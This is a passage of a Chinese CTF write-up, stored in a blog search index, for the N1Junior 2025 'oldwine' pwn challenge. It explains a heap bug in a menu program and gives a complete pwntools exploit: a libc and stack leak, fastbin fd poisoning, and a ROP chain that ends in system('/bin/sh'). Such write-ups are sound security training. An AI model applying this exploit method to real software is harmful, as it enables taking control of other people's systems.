Pwn","uri":"/posts/n1junior2025/#oldwine"},{"categories":["WP"],"collections":null,"content":"逆向分析\r菜单题 add： 根据读入的data_size申请堆块，chunk限制小于等于0x60 并把读入的account、password、堆块地址八字节一写，写0x18一组进0x602040 最后把password根据password的第一个字节对其进行异或加密，还把存储的堆地址的最后一个字节给加密了 delete： free掉堆块，把account、password、堆块地址置0 show： 输入idx，验证password，通过就打印account和data data这里用的是%s，没有\\x00就会一直输出 需要知道的几个点： 把密码的最后一个字节设置成\\x00，就能绕过加密 我们free掉的是加密后的堆地址，可以通过控制加密后的地址，实现邻近地址的任意free（这也是这道题的核心利用点） 我的思路： 泄露libc： 通过libc中的__environ泄露栈地址： 到栈上做ROP： 首先这么构造堆块 data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 可以看到经过异或加密，delete(0)的时候，实际上是去delete那个伪造的unsorted bin 接下来，再去把哪个Unsorted bin中的堆块申请出来的时候，其中的libc地址还在那里，泄露出来就行 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) 接下来，通过伪造fastbin的fd，把堆块申请到bss上 delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 这部分delete(2)之后的堆结构： 然后申请的是0x60的chunk，fastbin没有满足的，unsortedbin中有一个满足，又因为0x70-0x60 \u003c 0x20，如果切割剩下的堆块小于0x20，所以整个都给分配出来，再往fastbin的fd写入bss地址 接着往bss上写入environ去泄露栈地址： add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) 做ROP的环节还是覆盖fastbin的fd，讲一下比较关键的部分： 我们可以执行下面的命令来看看申请fastbin到哪里，怎么申请： 有两个地址可以供我们使用，但是有一个是需要0x70的fastbin，我们最大只能申请0x60的chunk，所以用第二个。把堆申请到这里，再去system(\"/bin/sh\")就可以了 ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:1","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#逆向分析-1"},{"categories":["WP"],"collections":null,"content":"exp\r其实感觉还有更简单的方法 from pwn import * context.terminal = [\"tmux\", \"splitw\", \"-h\"] context(os='linux',arch='amd64',log_level='debug') def dbg(): gdb.attach(p) # pause() address = './pwn' p = process(address) elf = ELF(address) libc = elf.libc ip = \"host.docker.internal\" port = 5555 # p = remote(ip,port) def cmd(idx): p.recvuntil(b'\u003e\u003e ') p.sendline(str(idx).encode()) def add(account,password,size,data): cmd(1) p.sendafter(b'[account]: ',account) p.sendafter(b'[password]: ',password) p.sendafter(b'[data size]: ',str(size)) p.sendafter(b'[data]: ',data) def delete(idx,password): cmd(2) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) def show(idx,password): cmd(3) p.sendafter(b'[idx]: ',str(idx).encode()) p.sendafter(b'[verify]: ',password) #泄露libc data = p64(0)+p64(0x91) add(p64(0x123),p8(0x50),0x10,data) #0 data = p64(0) + p64(0xa1) add(p64(0x123),p64(0),0x50,data) #1 data = b'aaaa' add(p64(0x123),p64(0),0x40,data) #2 add(p64(0x123),p64(0),0x10,data) #3 delete(0,p8(0x50)) #0被free data = b'p'*8 add(p64(0x123),p64(0),0x20,data) #0 show(0,p64(0)) p.recvuntil(b'p'*8) libc_base = u64(p.recv(6).ljust(8,b'\\x00')) - 0x3c4c08 success(\"libc_base -\u003e 0x%x\",libc_base) environ = libc_base + libc.symbols['__environ'] environ_lastbyte = environ \u0026 0xff success(\"environ -\u003e 0x%x\",environ) delete(2,p64(0)) #进入fastbin #2被free #覆盖fastbin中堆块的fd pl = p64(0)*3 + p64(0x51) + p64(0x602098) #绕过对fastbin的size的检查 add(p64(0x123),p64(0),0x50,pl) #2 add(p64(0x50),p64(0),0x40,data) #4 #泄露栈地址 data = p64(0) + p64(environ) add(p64(0x123),p64(0),0x40,data) #5，0x6020a8 show(4,p64(0)) p.recvuntil(b'[data]: ') stack_addr = u64(p.recv(6).ljust(8,b'\\x00')) success(\"stack_addr -\u003e 0x%x\",stack_addr) #ROP data = b'aaaa' add(p64(0x123),p64(0x30),0x10,data) #6 pl = p64(0) + p64(0x61) + p64(0) + p64(0x61) add(p64(0x123),p64(0),0x50,pl)#7 #下面这两个堆块用于防止consolidate和对invalid next size (fast)的检测 data = p64(0) + p64(0x51) add(p64(0x123),p64(0),0x10,data)#8 data = p64(0)*2 + p64(0) + p64(0x31) add(p64(0x123),p64(0xe0),0x20,data)#9 delete(9,p64(0xe0)) #可以控制堆块 delete(6,p64(0x30)) #改堆块8的size为0x41,做ROP pl = p64(0) + p64(0x61) + p64(0)*7 + p64(0x41) add(p64(0x123),p64(0),0x50,pl) #6 #接下来free掉堆块8,其size为0x41,进入fast bin add(p64(0x123),p64(0),0x10,data) #9 add(p64(0x123),p64(0),0x10,data) #10 delete(8,p64(0)) #改堆块8的fd为栈地址,让其size为0x40 fake_fast_addr = stack_addr - 0x136 rbp = stack_addr + 0xf8 pl = p64(0)*7 + p64(0x41) + p64(fake_fast_addr) success(\"fake_fast_addr -\u003e 0x%x\",fake_fast_addr) add(p64(0x123),p64(0),0x50,pl)#8 add(p64(0x123),p64(0),0x30,data) #11 system_addr = libc_base + libc.sym['system'] binsh_addr = libc_base + next(libc.search(\"/bin/sh\")) pop_rdi_ret = 0x0000000000400df3 pl = b'\\x00'*6 + p64(0) + p64(rbp) pl+=p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr) add(p64(0x123),p64(0),0x30,pl) # dbg() p.interactive() ","date":"2025-03-12","objectID":"/posts/n1junior2025/:3:2","tags":null,"title":"N1Junior_2025 Pwn","uri":"/posts/n1junior2025/#exp"}]